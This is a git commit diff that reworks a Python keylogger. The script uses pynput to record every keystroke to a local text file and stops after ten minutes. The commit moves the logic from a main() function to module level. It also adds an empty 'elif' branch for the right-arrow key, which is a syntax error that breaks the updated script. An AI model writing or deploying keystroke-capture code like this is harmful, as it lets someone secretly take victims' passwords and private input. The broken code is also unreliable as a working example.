9fef70ff156077d7a8411d302ab7d0001753d011
mrpol <pkoinis8@gmail.com>
2022-05-25 13:15:12 +0300

    Update keylogger.py

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -1,48 +1,39 @@
 from threading import Timer
 from pynput.keyboard import Listener
 import sys
-
-def main():
     
-    def on_press(key):
+def on_press(key):
 
-        button = str(key)
-        button = str(key).replace("'", "")
+    button = str(key)
+    button = str(key).replace("'", "")
 
-        # Special keys
+    # Special keys
 
-        if button == "Key.space":
-            button = ' '
-        elif button == "Key.shift":                                   
-            button = ''
-        elif button == "Key.ctrl_l":
-            button = ""
-        elif button == "Key.ctrl":
-            button = ""
-        elif button == "Key.enter":
-            button = "\n"
-        elif button == "Key.backspace":
-            button = '-'
-        elif button == "Key.f12":           # f12 kills the listener
-            print ("f12 pressed")
-            sys.exit(-1)
+    if button == "Key.space":
+        button = ' '
+    elif button == "Key.shift":                                   
+        button = ''
+    elif button == "Key.ctrl_l":
+        button = ""
+    elif button == "Key.ctrl":
+        button = ""
+    elif button == "Key.enter":
+        button = "\n"
+    elif button == "Key.backspace":
+        button = '-'
+    elif button == "Key.right":
+    elif button == "Key.f12":           # f12 kills the listener
+        print ("f12 pressed")
+        sys.exit(-1)
+    
             
 
-        with open("keylogger.txt", 'a') as f:   # set the path
-            f.write(button)
+    with open("keylogger.txt", 'a') as f:
+        f.write(button)
 
-    # Collecting events until stopped
+# Collecting events until stopped
 
-    with Listener(on_press=on_press) as listener:
-        Timer(600, listener.stop).start()              # The listener stops automatically after 600 seconds
-        listener.join()
-        print("The listener stopped")
-
-
-if __name__ == "__main__":
-   try:
-      main()
-   except KeyboardInterrupt:
-      # do nothing here
-      pass
-
+with Listener(on_press=on_press) as listener:
+    Timer(600, listener.stop).start()              # The listener stops automatically after 600 seconds
+    listener.join()
+    print("The listener stopped")
